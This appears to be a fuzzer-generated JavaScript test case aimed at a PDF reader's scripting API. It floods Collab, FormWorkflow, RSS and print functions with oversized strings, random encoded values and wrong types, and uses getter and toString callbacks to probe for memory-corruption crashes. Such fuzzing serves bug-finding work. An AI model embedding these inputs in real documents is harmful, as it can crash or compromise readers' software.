+f53=function(){try{this.app.fsClick=false}catch(e){};try{this.Collab.bringToFront({oDoc:Array(0x2ce).join("\\x02")})}catch(e){};try{this.FormWorkflow.unregisterFormsWorkflow({cFormWorkflowID:Array(0x105c).join("\\x33")})}catch(e){};try{this.Collab.getCustomServerLink({cServerType:"\\x4d\\xcd\\xa7\\x65\\x68"})}catch(e){};try{this.spawnPageFromTemplate({cTemplate:"\\x71\\xf8\\x56\\x28\\x7a\\x59\\x6e\\x4d",nPage:-3950.8081,bRename:false,bOverlay:false,oXObject:[]})}catch(e){}}
+f54=function(){try{this.Collab.returnToInitiator({cReviewID:"\\x50\\xe3"})}catch(e){};try{this.app.fsUsePageTiming=true}catch(e){};try{this.RSS.addUI({cURL:"\\x67\\x32\\x4d\\x3c\\x3e\\x22\\x63\\x61\\x6b",oDriver:{}})}catch(e){}}
+f55=function(){try{this.Collab.getReviewState({cReviewID:Array(0xdb1d).join("\\x0f")})}catch(e){};try{this.Collab.unregisterOffline({doc:"\\ua24c\\u8fac\\uf071\\u53af\\ua066\\ue11d\\u71cb\\ud521\\udb06\\u4829\\ub6a7\\u2813\\u2c36\\ua63c\\u567a\\ud20d\\u1f2e\\uc1c2\\u5295\\u500b"})}catch(e){};try{this.app.findComponent({cType:"\\x4f\\x70\\x65\\x6e",cName:"\\x57\\x69\\x70\\x65\\x4c\\x65\\x66\\x74",cDesc:"\\uca92\\u34a8\\u7a54\\ub3e5\\uf8a6\\ub181\\u36c6\\uc0a2\\u172f",cVer:"\\ub92c\\ufa7a",oParams:false})}catch(e){}}
+f56=function(){try{this.FormWorkflow.removeMultipleSelectedFormWorkflowsInTracker()}catch(e){};try{this.FormWorkflow.setFormFolderForMultipleForms({cCategory:"",oDocIDs:[],cFolder:"\\u334e\\u354a\\uc0d6\\u375b\\u071e\\u2a89\\u1813\\ud4a1"})}catch(e){};try{this.Collab.setReviewFolderForMultipleReviews({cCategory:Array(0x529).join("\\ufada"),oDocIDs:[],cFolder:"\\xe6\\x5a\\xa9\\x5a\\x70\\x68\\x20"})}catch(e){}}
+f57=function(){try{this.FormWorkflow.getFormWorkflowFolders({cCategory:"\\x24"})}catch(e){};try{this.RSS.update({cURL:"\\x47\\x6c\\x69\\x74\\x74\\x65\\x72\\x55\\x70"})}catch(e){};try{this.appRightsValidate({nValidateOption:11344492.42584,bUI:false})}catch(e){};try{this.Collab.getReviewFolder({cCategory:Array(0xe9f).join("\\x25"),oDoc:"\\u9be3\\u5552\\uf674"})}catch(e){}}
+f58=function(){try{this.Collab.setStoreFSBased({cName:Array(0x608).join("\\x27"),bFSBased:false})}catch(e){};try{this.Collab.cosObj2Stream({obj:this.Net.Subscriptions})}catch(e){};try{this.FormWorkflow.addFormWorkflowFolder({cCategory:"\\x74\\x49",cFolder:"\\x9c"})}catch(e){};try{this.requestPermission({cType:Array(0xf7a).join("\\xf0"),cOperation:"\\x4b",cExcludePermHandler:Array(0x357).join("\\xbe")})}catch(e){}}
+f59=function(){try{this.shareIdentity.FullName=Array(0xa05).join("\\x62")}catch(e){};try{this.Collab.getStoreSettings({cName:"\\x46\\x6f\\x78\\x69\\x74\\x20\\x52\\x65\\x61\\x64\\x65\\x72"})}catch(e){};try{this.Collab.getServiceURL({cURL:Array(0x50aa).join("\\u5a1c")})}catch(e){};try{this.Collab.getReviewFolders({cCategory:"\\x4b\\x21\\x28\\x44\\x30\\xed\\x76\\x6b\\x87\\x72\\xdd\\x57\\x4a\\x4d\\x47\\x3b",oDoc:false})}catch(e){};try{this.Collab.privateAnnotsAllowed=true}catch(e){}}
+f60=function(){try{this.Collab.setReviewRespondedDate({doc:{},date:{}})}catch(e){};try{this.Collab.addAnnotStore({cName:"\\x5c\\x28\\x5c\\x64\\x7b\\x30\\x2c\\x33\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x30\\x2c\\x33\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x30\\x2c\\x34\\x7d",cUIName:"",factory:7.8,cSettings:"\\x1b\\x13\\x61\\x25\\x6f\\x71\\x6a\\x62\\x4f\\x6d\\x21\\x68\\x77",bHidden:true})}catch(e){};try{this.shareIdentity.Corporation=Array(0xad51).join("\\x84")}catch(e){};try{this.app.fsColor={}}catch(e){}}
+f61=function(){try{this.Collab.URL2PathFragment({cURL:Array(0x76c).join("\\u2831")})}catch(e){};try{this.Collab.setDefaultReviewServer({cURL:Array(0x59aa).join("\\x41"),cUIName:Array(0x3a9).join("\\x67"),cReviewType:"\\x64\\x69\\x43"})}catch(e){};try{this.Collab.newWrStreamToCosObj()}catch(e){};try{this.Collab.setReviewFolder({cCategory:"\\x25\\x42\\x48\\x43\\x08\\x51\\x4c\\x40\\x24\\x46\\x93\\x33",oDoc:"",cFolder:Array(0xb54).join("\\x49")})}catch(e){}}
+f62=function(){try{this.Collab.setReviewRespondedDate({doc:this.Net.SOAP,date:false})}catch(e){};try{this.Net.Subscriptions.getResourceContents({cURL:"\\x41\\xc2\\x41\\x55"})}catch(e){};try{this.stampAPFromPage({cName:"\\x52\\x65\\x66\\x6c\\x6f\\x77\\x57\\x69\\x64\\x74\\x68",matrix:{c:-130.7993,h:1464.5,v:10.74},cLang:"\\x48\\x47\\x54\\xac\\x55\\x4e\\x81\\xa9\\x73\\x7a\\x67",rect:[],bIncludeAnnots:true,bWhiteBackground:true})}catch(e){}}
+try{this.Collab.setStoreSettings({cName:"\\xc1\\x73",cSettings:"\\xc0\\x24\\xfd"})}catch(e){}
+try{this.Collab.uriNormalize({cURI:"\\x29",bMock:false})}catch(e){}
+var fs0 = function(){f0();return Array(0x2df).join("\\x6a");}
+var os0 = {};os0.toString = fs0;try{this.Collab.getReviewError({cReviewID:os0})}catch(e){}
+try{this.app.fsTimeDelay=-14.7863}catch(e){}
+try{this.app.fsLoop=true}catch(e){}
+try{this.annotFilter={}}catch(e){}
+try{this.Collab.collapseTrackerSelection()}catch(e){}
+var fs1 = function(){f1();return "\\x48\\x65\\x6c\\x76\\x65\\x74\\x69\\x63\\x61\\x2d\\x4f\\x62\\x6c\\x69\\x71\\x75\\x65";}
+var os1 = {cHTMLString:"\\x0c"};
+Object.defineProperties(os1, {cHTMLString: {get: fs1}});;try{this.Collab.saveTrackerHTML(os1)}catch(e){}
+try{this.util.charToByte({cStr:"\\ufb26"})}catch(e){}
+try{this.app.fsLoop=false}catch(e){}
+try{this.Net.streamFromString({cString:"\\x5a\\x61\\x70\\x66\\x44\\x69\\x6e\\x67\\x62\\x61\\x74\\x73"})}catch(e){}
+try{this.Collab.getStoreFSBased({cName:Array(0xbab1).join("\\x50")})}catch(e){}
+var fs2 = function(){f2();return {};}
+var os2 = {};os2.valueOf = fs2;try{this.Collab.makeAllCommentsReadOnly({doc:os2,selfDestruct:true})}catch(e){}
+try{this.FormWorkflow.removeFormWorkflowFolder({cCategory:"\\x43\\x6f\\x75\\x72\\x69\\x65\\x72",cFolder:"\\x56\\x54\\x7b\\x28"})}catch(e){}
+var fs3 = function(){f3();return Array(0x9a2).join("\\ud5b7");}
+var os3 = {cURL:Array(0x2831).join("\\u47cc")};
+Object.defineProperties(os3, {cURL: {get: fs3}});;try{this.Collab.URL2PathFragment(os3)}catch(e){}
+try{this.FormWorkflow.setFormFolderForMultipleForms({cCategory:"\\x43\\x6f\\x76\\x65\\x72\\x4c\\x65\\x66\\x74\\x44\\x6f\\x77\\x6e",oDocIDs:[],cFolder:"\\x48"})}catch(e){}
+try{this.tts.qTone()}catch(e){}
+try{this.Collab.uriNormalize({cURI:Array(0xb336).join("\\x56")})}catch(e){}
+try{this.app.fsUsePageTiming=true}catch(e){}
+try{this.FormWorkflow.addFormWorkflowFolder({cCategory:"\\x57\\x69\\x70\\x65\\x52\\x69\\x67\\x68\\x74\\x44\\x6f\\x77\\x6e",cFolder:3})}catch(e){}
+try{this.app.fsClick=true}catch(e){}
+try{this.Collab.isOfflineReview({doc:[]})}catch(e){}
+try{this.Collab.uriEncode({cURI:Array(0xbc71).join("\\x6b")})}catch(e){}
+try{this.Collab.hasInitiatorEmailRequest({doc:{}})}catch(e){}
+try{this.Net.wireDump=true}catch(e){}
+try{this.Collab.getAlwaysUseServer({cReviewType:Array(0x87c).join("\\x21")})}catch(e){}
+try{this.Collab.getReviewFolders({cCategory:Array(0x8db).join("\\x68"),oDoc:true})}catch(e){}
+var fs4 = function(){f4();return "\\uefdd\\uf3b2\\u2202\\u2b9f\\u68be\\u881a\\uf3d8\\u9de3\\u0638\\udeff\\u336c\\u578c\\u1058";}
+var os4 = {};os4.toString = fs4;try{this.Collab.AVUMStartPayloadWrapper({cat:os4,subcat:"\\x4c\\x3b\\x76\\x66\\x81",evnt:"\\u58ee\\ue853\\ue910\\u6125\\u3ca2\\u71e1"})}catch(e){}
+try{this.Collab.isOnlineReview({doc:[],bLax:true})}catch(e){}
+var fs5 = function(){f5();return "\\x5c\\x2f\\x0e\\x51\\x51\\x67\\x75\\x43\\x4c";}
+var os5 = {cURL:Array(0x6173).join("\\x41"),oDriver:this.app};
+Object.defineProperties(os5, {cURL: {get: fs5}});;try{this.RSS.addUI(os5)}catch(e){}
+var fs6 = function(){f6();return "\\x49\\xef\\x61\\x77\\x42\\x4b\\x5a\\x7c\\x40\\x2c";}
+var os6 = {};os6.toString = fs6;try{this.app.isValidSaveLocation({cPath:os6,cFS:"\\x5a\\x61\\x60\\x4f\\xc0\\xc5\\xac\\x36\\x62\\x43\\x68\\x57\\xa3"})}catch(e){}
+try{this.Collab.isDocReadOnly({cDocPath:Array(0xd4e).join("\\ufebc")})}catch(e){}
+try{this.Collab.getAggregateReviewInfo()}catch(e){}
+var fs7 = function(){f7();return [];}
+var os7 = {};os7.valueOf = fs7;try{this.Collab.canProxy({doc:os7})}catch(e){}
+try{this.Collab.uriConvertReviewSource({cURL:"\\x46\\x6c\\x79\\x52\\x69\\x67\\x68\\x74"})}catch(e){}
+try{this.Collab.getReviewFolders({cCategory:"\\x50\\x75\\x73\\x68\\x4c\\x65\\x66\\x74",oDoc:"\\x4a\\xed\\x42"})}catch(e){}
+var fs8 = function(){f8();return Array(0x28c5).join("\\x20");}
+var os8 = {};os8.toString = fs8;try{this.Collab.unregisterReview({doc:os8})}catch(e){}
+try{this.shareIdentity.FullName=Array(0xd782).join("\\x78")}catch(e){}
+var fs9 = function(){f9();return false;}
+var os9 = {doc:[],bLax:false};
+Object.defineProperties(os9, {bLax: {get: fs9}});;try{this.Collab.isSharedReview(os9)}catch(e){}
+try{this.Collab.AVUMStartPayloadWrapper({cat:3,subcat:3,evnt:"\\x8b\\x73\\x67\\x4b\\x8b\\x47\\x5f\\xc1\\x6b"})}catch(e){}
+try{this.Collab.getEmailDistributionReviewServer({cReviewType:"\\uebd1\\u6cca\\ub41f\\u005f\\ua6cd\\u0b1a\\u0971\\u897e"})}catch(e){}
+try{this.annotFilter="\\xa0\\x55\\xec\\x11\\x67\\x0a"}catch(e){}
+try{this.Collab.convertMappedDrivePathToSMBURL({cPath:"\\u9aba\\ud3bd\\ud302\\u65da\\ud50d\\u1c16\\u173f\\ue788"})}catch(e){}
+var fs10 = function(){f10();return {};}
+var os10 = {};os10.valueOf = fs10;try{this.Collab.cosObj2Stream({obj:os10})}catch(e){}
+try{this.Collab.init({cUser:"\\x31\\x79\\x31\\x3f"})}catch(e){}
+try{this.Collab.isDocCenterURL({cURL:Array(0x71ae).join("\\xf4")})}catch(e){}
+try{this.Collab.sync({cUser:"\\ubc47\\uc859\\ub03f\\u3b8d\\u2518\\u2396\\ubc79\\u7854\\ubd3f\\u76a1",bUpdateStore:false,bUpdateDoc:true})}catch(e){}
+try{this.app.fsLoop=true}catch(e){}
+try{this.util.charToByte({cStr:"\\x4f\\x4c"})}catch(e){}
+try{this.FormWorkflow.getNumberOfFormWorkflowsOnServer({cServer:Array(0x594).join("\\xcf")})}catch(e){}
+try{this.Collab.isDocCentreSignupDisabled()}catch(e){}
+var fs11 = function(){f11();return "\\xa8\\x7e\\x46\\x48\\x30\\xd2\\x58\\x55\\x82\\x23\\x02";}
+var os11 = {doc:"\\u0e08\\ua68d\\ue67b\\u1bd2\\u27df\\u5e62\\u1312\\ue458\\u305f\\ub406\\u0741\\u6675\\ue3e4"};
+Object.defineProperties(os11, {doc: {get: fs11}});;try{this.Collab.unregisterReview(os11)}catch(e){}
+var fs12 = function(){f12();return "\\xe6";}
+var os12 = {};os12.toString = fs12;try{this.Collab.AVUMStartPayloadWrapper({cat:Array(0xfe1).join("\\xd5"),subcat:os12,evnt:"\\x1a\\x12\\xab"})}catch(e){}
+var fs13 = function(){f13();return "\\u3c01\\u6905\\ubbe9\\uc5fc";}
+var os13 = {};os13.toString = fs13;try{this.util.charToByte({cStr:os13})}catch(e){}
+var fs14 = function(){f14();return Array(0x5a92).join("\\x79");}
+var os14 = {};os14.toString = fs14;try{this.Collab.removeReviewFolder({cCategory:os14,cFolder:3})}catch(e){}
+try{this.Collab.hashString({cStr:Array(0xd9b).join("\\x56")})}catch(e){}
+try{this.Collab.setReviewRespondedDate({doc:[],date:true})}catch(e){}
+try{this.shareIdentity.Email="\\u8a4b\\u429a\\u6c59\\u044e\\u0627\\u7239\\u7ced\\u503d\\ufc64\\ua104\\u8738\\u3fcc\\u9902\\u89a1\\u2477\\u28cc"}catch(e){}
+var fs15 = function(){f15();return 56851.869030436;}
+var os15 = {};os15.valueOf = fs15;var fs16 = function(){f16();return 1861.2;}
+var os16 = {};os16.valueOf = fs16;try{this.printWithParams({colorProfile:"",nUpNumPagesV:9.2490694421,fontPolicy:9.819649297,pageHandling:46810.5,DuplexType:1607484353.8152,nUpNumPagesH:os15,selectedArea:{},nUpPageOrder:11.89472,printerName:"\\x77\\x78\\x79",nUpPageBorder:false,NumCopies:12.599,rasterFlags:2065.3303,transparencyLevel:8.1,printAsImage:true,tileLabel:false,printContent:2613.51,downloadFarEastFonts:true,tileOverlap:1170.2751,outputType:37652.6,usePrinterCRD:24749.54648012,fileName:"",pageSubset:35642.29382,useT1Conversion:2035.31,bitmapDPI:os16,tileMark:3741.6382,colorOverride:57089.1851,flags:3715.3,gradientDPI:3342.81})}catch(e){}
+var fs17 = function(){f17();return 8496.2361736311;}
+var os17 = {};os17.valueOf = fs17;try{this.app.fsCursor=os17}catch(e){}
+var fs18 = function(){f18();return Array(0x78f3).join("\\u5ce6");}
+var os18 = {doc:{},scriptName:Array(0x82a).join("\\x6d")};
+Object.defineProperties(os18, {scriptName: {get: fs18}});;try{this.Collab.removeApprovalDocScript(os18)}catch(e){}
+try{this.app.fsLoop=false}catch(e){}
+try{this.Collab.setStoreSettings({cName:Array(0xa9f).join("\\uad32"),cSettings:Array(0x9b54).join("\\x7b")})}catch(e){}
+try{this.Collab.unregisterReview({doc:"\\ua3bb\\u6d90\\u9184"})}catch(e){}
+try{this.Net.stringFromStream({oStream:[]})}catch(e){}
+var fs19 = function(){f19();return Array(0xb85).join("\\x70");}
+var os19 = {};os19.toString = fs19;try{this.Collab.allReviewServers({cReviewType:os19})}catch(e){}
+try{this.Collab.isDocCentreSignupDisabled()}catch(e){}
+try{this.Collab.stream2CosObj({stream:[]})}catch(e){}
+try{this.Collab.AVUMAddStringToPayloadWrapper({name:"\\u0b77",val:"\\x79\\x5d\\x59\\x61\\x79\\x65\\x6a\\xb4"})}catch(e){}
+var fs20 = function(){f20();return "\\xe1\\xb1";}
+var os20 = {cURL:"\\x46\\x69\\x74\\x50\\x61\\x67\\x65",oDriver:{}};
+Object.defineProperties(os20, {cURL: {get: fs20}});;try{this.Net.Subscriptions.addUI(os20)}catch(e){}
+var fs21 = function(){f21();return [];}
+var os21 = {};os21.valueOf = fs21;try{this.Collab.isSharedReview({doc:os21,bLax:true})}catch(e){}
+try{this.Collab.returnToInitiator({cReviewID:Array(0x389).join("\\x79")})}catch(e){}
+try{this.Collab.registerApproval({doc:{},initiator:"\\u9adf",initScript:3,invitees:Array(0xfb1).join("\\x53"),cc:"\\xe1\\x59\\x52\\x53\\x21\\x48\\x45\\x41\\xb9",sentDate:3189.01,deadDate:true,selfDestruct:true,initiatorEmail:false})}catch(e){}
+try{this.Collab.isDocReadOnly({cDocPath:""})}catch(e){}
+var fs22 = function(){f22();return true;}
+var os22 = {cTemplate:"\\xf5\\x16\\x52\\x78\\xe4\\x47\\x57",nPage:6.9,bRename:false,bOverlay:true,oXObject:[]};
+Object.defineProperties(os22, {bRename: {get: fs22}});;try{this.spawnPageFromTemplate(os22)}catch(e){}
+try{this.Collab.getUserIDFromStore()}catch(e){}
+try{this.app.mailMsgWithAttachment({bUI:false,cCc:"\\u239e\\u72bc\\u6797\\ue251\\u510a\\u6c59",cBcc:"\\x51\\x6b\\x5c\\x50\\x47\\x3f\\x6d\\x51\\x41",cMsg:"\\x78\\xe9\\x53\\x31\\x47\\x73\\x54\\xa7\\x6b\\x39\\x3e\\x58\\x62\\xb5\\x4e",cFS:Array(0x43ae).join("\\u19f7")})}catch(e){}
+try{this.Collab.getDocCenterReviewServer({cReviewType:Array(0xeec).join("\\u866a")})}catch(e){}
+try{this.Collab.uriConvertReviewSource({cURL:"\\uf598\\u6e07\\u92eb\\u5d23\\u8401\\u51d5\\u9bbe\\u8160"})}catch(e){}
+var fs23 = function(){f23();return {};}
+var os23 = {};os23.valueOf = fs23;try{this.Collab.isOnlineReview({doc:os23,bLax:true})}catch(e){}
+try{this.Collab.collapseTrackerSelection()}catch(e){}
+try{this.FormWorkflow.getAggregateFormWorkflowInfo()}catch(e){}
+try{this.Collab.unsetFirstLaunch({cReviewType:Array(0xae3).join("\\x64")})}catch(e){}
+try{this.Net.Subscriptions.addFeed({cURL:"\\u46e6\\u20d3\\u5a65\\uaef7\\uadfb",cType:"\\x79\\x0e\\x72\\x3c\\x7b\\x53"})}catch(e){}
+try{this.Collab.setReviewFolder({cCategory:"\\x42\\x6c\\x69\\x6e\\x64\\x73\\x48\\x6f\\x72\\x69\\x7a\\x6f\\x6e\\x74\\x61\\x6c",oDoc:Array(0x626d).join("\\ufeed"),cFolder:Array(0x4b5a).join("\\xee")})}catch(e){}
+try{this.FormWorkflow.removeFormWorkflowFolder({cCategory:Array(0xabc5).join("\\x9a"),cFolder:"\\ud7e8\\u24c2\\u316e\\u10e6\\uef0b\\u6cc5\\u4052\\u06ad\\u034f"})}catch(e){}
+var fs24 = function(){f24();return Array(0xbdc0).join("\\x3b");}
+var os24 = {cCategory:3,oDoc:3,cFolder:Array(0x8d3).join("\\x01")};
+Object.defineProperties(os24, {cCategory: {get: fs24}});;try{this.Collab.setReviewFolder(os24)}catch(e){}
+try{this.app.fsUseTimer=false}catch(e){}
+try{this.Collab.getReviewFolders({cCategory:Array(0x63c).join("\\ua832")})}catch(e){}
+var fs25 = function(){f25();return Array(0x5ac).join("\\x81");}
+var os25 = {cName:Array(0x6c3).join("\\x58")};
+Object.defineProperties(os25, {cName: {get: fs25}});;try{this.stampAPFromPage(os25)}catch(e){}
+try{this.Collab.createUniqueDocID()}catch(e){}
+try{this.enableWindows()}catch(e){}
+try{this.Collab.getReviewFolders({cCategory:3})}catch(e){}
+try{this.Collab.init({cUser:"\\u1c20\\uefb8\\ue09f\\u4c0b\\ud242\\uf010\\u41d2\\ubfd7"})}catch(e){}
+try{this.FormWorkflow.getNumberOfFormWorkflowsOnServer({cServer:"\\x38\\x51\\x56\\xf0\\x60\\x52"})}catch(e){}
+try{this.Collab.uriEncode({cURI:Array(0x2157).join("\\x4b")})}catch(e){}
+try{this.Collab.getProgressInfo()}catch(e){}
+try{this.Net.Subscriptions.addUI({cURL:Array(0xc33).join("\\x53"),oDriver:{}})}catch(e){}
+try{this.Net.Subscriptions.removeFeed({cURL:"\\u4dff\\u08af\\uc4eb\\ub6f7\\ue0d1\\u5878\\ucd9f\\ub238\\ua9a4\\u1421"})}catch(e){}
+var fs26 = function(){f26();return true;}
+var os26 = {};os26.valueOf = fs26;try{this.Collab.privateAnnotsAllowed=os26}catch(e){}
+try{this.app.fsTimeDelay=1}catch(e){}
+try{this.Collab.allReviewServers({cReviewType:Array(0x192).join("\\xc4")})}catch(e){}
+var fs27 = function(){f27();return "\\x42\\x2e\\xdd";}
+var os27 = {cURL:"\\x54\\x69\\x6d\\x65\\x73\\x2d\\x49\\x74\\x61\\x6c\\x69\\x63",cUIName:"\\x70\\x31\\x78\\xaa\\xe2\\x0c\\x59",cReviewType:"\\x67\\x3a\\x08\\x6a\\x59\\x52"};
+Object.defineProperties(os27, {cUIName: {get: fs27}});;try{this.Collab.setAlwaysUseServer(os27)}catch(e){}
+try{this.wireframe=true}catch(e){}
+try{this.Collab.showBasicAuditTrail=true}catch(e){}
+try{this.Collab.isEmailReview({doc:{},bLax:true})}catch(e){}
+try{this.Collab.defaultStore=Array(0x899e).join("\\x74")}catch(e){}
+try{this.Collab.setReviewRespondedDate({doc:this.app.media.priv,date:"\\xa3\\x42\\x3e\\x56\\xc8"})}catch(e){}
+try{this.Collab.isApprovalWorkflow({doc:[]})}catch(e){}
+var fs28 = function(){f28();return "";}
+var os28 = {};os28.toString = fs28;try{this.app.findComponent({cType:os28,cName:Array(0x8ae5).join("\\x68"),cDesc:"\\x62",cVer:"\\x63\\xde\\x4d",bSilent:true})}catch(e){}
+try{this.Collab.removeReviewFolder({cCategory:3,cFolder:Array(0x3a8).join("\\uefa1")})}catch(e){}
+try{this.tts.qTone()}catch(e){}
+var fs29 = function(){f29();return [];}
+var os29 = {};os29.valueOf = fs29;try{this.Collab.registerApproval({doc:os29,initiator:"\\x47\\x6c\\x69\\x74\\x74\\x65\\x72\\x4c\\x65\\x66\\x74\\x44\\x6f\\x77\\x6e",bInitiating:true,initScript:"\\x4c\\xf2\\x68\\x51\\x4c\\x72",cc:"\\u279c\\u76e8\\u1442",deadDate:true,ui:true,selfDestruct:false,initiatorEmail:true})}catch(e){}
+try{this.Collab.stringToUTF8({ucsStr:"\\x60\\x63\\x10\\x51\\x23\\xfe"})}catch(e){}
+var fs30 = function(){f30();return "\\x57\\x69\\x70\\x65\\x52\\x69\\x67\\x68\\x74\\x55\\x70";}
+var os30 = {};os30.toString = fs30;try{this.Collab.URL2PathFragment({cURL:os30})}catch(e){}
+try{this.Collab.isDocCentreSignupDisabled()}catch(e){}
+try{this.Collab.isApprovalWorkflow({doc:this.RSS})}catch(e){}
+try{this.Collab.goBackOnline({oDoc:"\\x57\\x69\\x70\\x65\\x44\\x6f\\x77\\x6e"})}catch(e){}
+var fs31 = function(){f31();return {};}
+var os31 = {};os31.valueOf = fs31;try{this.Collab.bringToFront({oDoc:os31})}catch(e){}
+try{this.Collab.setStoreNoSettings({cName:3,bNoSettings:true})}catch(e){}
+try{this.FormWorkflow.setFormWorkflowFolder({cCategory:"\\x72\\x3b\\x3d\\x56",cDocID:"\\u5b64\\u1b93\\ub697\\ub642\\uef3e\\u9675\\u9393\\uabae\\ubd91",cFolder:3})}catch(e){}
+try{this.util.charToByte({cStr:Array(0x4416).join("\\ub3db")})}catch(e){}
+try{this.Collab.privateAnnotsAllowed=false}catch(e){}
+try{this.Collab.addReviewFolder({cCategory:"\\x35\\x4a\\x3e\\xf4\\x55\\x71",cFolder:Array(0x32ab).join("\\u7578")})}catch(e){}
+try{this.Collab.AVUMStartPayloadWrapper({cat:"\\x6c\\x4f",subcat:"\\xf9\\x77\\xfa\\x3b\\x9d\\x42\\x5c\\x7c\\x4c\\x67\\x6d",evnt:Array(0xcba).join("\\x52")})}catch(e){}
+try{this.Collab.cosObj2Stream({obj:{}})}catch(e){}
+try{this.stampAPFromPage({cName:3,doc:this.Net.Discovery,cLang:"\\ue1ed\\uc57a\\u358b\\u68bf\\uf87d\\u2c43",rect:Array(0x10b).join("\\x6b"),bIncludeAnnots:true,bWhiteBackground:false})}catch(e){}
+var fs32 = function(){f32();return true;}
+var os32 = {};os32.valueOf = fs32;try{this.app.fsEscape=os32}catch(e){}
+try{this.Collab.hasReviewCommentRepositoryIntact({cReviewID:"\\x57\\x69\\x70\\x65\\x52\\x69\\x67\\x68\\x74\\x44\\x6f\\x77\\x6e"})}catch(e){}
+try{this.Collab.getReviewFolders({cCategory:"\\x50\\x72\\x65\\x66\\x65\\x72\\x72\\x65\\x64",oDoc:2.4})}catch(e){}
+try{this.createIcon({cStream:"\\u8ab4\\ud3f0\\ufd2b\\u8df5",nWidth:0.444,nHeight:1.5})}catch(e){}
+try{this.Collab.expandTrackerSelection()}catch(e){}
+try{this.app.fsCursor=7.5061}catch(e){}
+try{this.Collab.cosObj2Stream({obj:{}})}catch(e){}
+var fs33 = function(){f33();return "\\ub794\\uc2e8\\ud087\\u14e2\\u66a9\\u5968";}
+var os33 = {};os33.toString = fs33;try{this.Collab.registerReview({doc:{},initiator:Array(0x6352).join("\\x41"),initScript:os33,invitees:"\\ubde0\\u7192",cc:"\\x71\\x2e\\x71\\x58\\x2b\\x76\\x46\\x3a",bcc:Array(0xea4).join("\\u9bff"),deadDate:false,ui:true,selfDestruct:true,id:"\\x63",source:Array(0xbbd3).join("\\x76"),requireSave:true,distributionMethod:"\\u1345\\u039a\\ubd01",versionInfo:-4.2,accessLevel:2034235728.8,bezelMessage:Array(0x310f).join("\\x52"),displayWelcome:false})}catch(e){}
+try{this.Collab.isOnlineReview({doc:{},bLax:false})}catch(e){}
+var fs34 = function(){f34();return Array(0xf36d).join("\\x40");}
+var os34 = {};os34.toString = fs34;try{this.Collab.AVUMStartPayloadWrapper({cat:"\\x50\\x75\\x73\\x68\\x4c\\x65\\x66\\x74",subcat:os34,evnt:"\\x2a\\x2a\\x20\\x5e\\x5f\\x5e\\x20\\x2a\\x2a"})}catch(e){}
+var fs35 = function(){f35();return {};}
+var os35 = {};os35.valueOf = fs35;var fs36 = function(){f36();return false;}
+var os36 = {};os36.valueOf = fs36;var fs37 = function(){f37();return false;}
+var os37 = {doc:os35,bLax:os36};
+Object.defineProperties(os37, {bLax: {get: fs37}});;try{this.Collab.isApprovalWorkflow(os37)}catch(e){}
+try{this.Collab.convertMappedDrivePathToSMBURL({cPath:3})}catch(e){}
+var fs38 = function(){f38();return "\\ua289\\ucd1f\\u90a1\\uda5d\\uc2bf\\u5fcd";}
+var os38 = {};os38.valueOf = fs38;try{this.Collab.setReviewRespondedDate({doc:this.app,date:os38})}catch(e){}
+try{this.Net.Subscriptions.update({cURL:Array(0xcfb5).join("\\x49")})}catch(e){}
+try{this.Collab.setReviewFolderForMultipleReviews({cCategory:3,oDocIDs:[],cFolder:Array(0xdf40).join("\\x7f")})}catch(e){}
+try{this.Collab.makeAllCommentsReadOnly({doc:{},undoable:false,selfDestruct:false})}catch(e){}
+try{this.Collab.hasReviewDeadline({cReviewID:3})}catch(e){}
+try{this.Collab.unregisterApproval({doc:3})}catch(e){}
+try{this.tts.punctuations=Array(0xde7b).join("\\x5c")}catch(e){}
+var fs39 = function(){f39();return "\\x46\\x6f\\x78\\x69\\x74";}
+var os39 = {};os39.toString = fs39;try{this.stampAPFromPage({cName:"",matrix:{a:6.7,v:35437.777},cLang:os39,rect:[],bIncludeAnnots:false})}catch(e){}
+var fs40 = function(){f40();return "\\ue3b4\\uc371\\u80ea\\ufe89\\uad25\\ua10d\\ud560\\u6f01\\ub546";}
+var os40 = {};os40.toString = fs40;try{this.Collab.setStoreNoSettings({cName:os40,bNoSettings:false})}catch(e){}
+try{this.Net.Subscriptions.removeFeed({cURL:3})}catch(e){}
+try{this.Collab.URL2PathFragment({cURL:3})}catch(e){}
+try{this.Collab.allReviewServers({cReviewType:"\\x4b\\x88\\x40\\x4c\\x0a\\xc2\\x68\\x51"})}catch(e){}
+try{this.Collab.defaultStore="\\x45\\x95\\x6f\\x76"}catch(e){}
+try{this.tts.punctuations="\\x4d\\x86\\x74\\x67"}catch(e){}
+try{this.Net.Subscriptions.addFeed({cURL:"\\x62\\x36\\x4f\\xe0\\x53\\xdd",cType:"\\x5c\\x64\\x7b\\x30\\x2c\\x33\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x30\\x2c\\x32\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x30\\x2c\\x34\\x7d"})}catch(e){}
+try{this.Collab.setAlwaysUseServer({cURL:Array(0xb57).join("\\x6d"),cUIName:Array(0x78c2).join("\\u0909"),cReviewType:Array(0x98d5).join("\\x4d")})}catch(e){}
+var fs41 = function(){f41();return Array(0xcbc2).join("\\x3b");}
+var os41 = {cCategory:"\\x67\\x65\\x74\\x73\\x74\\x72\\x2e\\x70\\x64\\x66",cFolder:3};
+Object.defineProperties(os41, {cCategory: {get: fs41}});;try{this.Collab.addReviewFolder(os41)}catch(e){}
+try{this.Collab.disableDocCentreSignup()}catch(e){}
+try{this.Collab.URL2PathFragment({cURL:"\\u669c\\u38a4\\u4dc9\\uaa64"})}catch(e){}
+try{this.app.isValidSaveLocation({cPath:"\\x70\\x50",cFS:"\\x48\\x50\\x84\\x77\\x1c\\x63\\xe2\\x7a\\x22\\x8d\\x5a\\x42"})}catch(e){}
+var fs42 = function(){f42();return "\\x5e\\x51\\xe5\\x44";}
+var os42 = {cURL:3,cUIName:3,cReviewType:"\\xe5\\x52\\x7b\\x2c\\x75\\x61"};
+Object.defineProperties(os42, {cReviewType: {get: fs42}});;try{this.Collab.setDefaultReviewServer(os42)}catch(e){}
+try{this.Collab.returnToInitiator({cReviewID:Array(0x64bd).join("\\uaf11")})}catch(e){}
+try{this.Net.streamFromString({cString:3})}catch(e){}
+try{this.Net.wireDump=false}catch(e){}
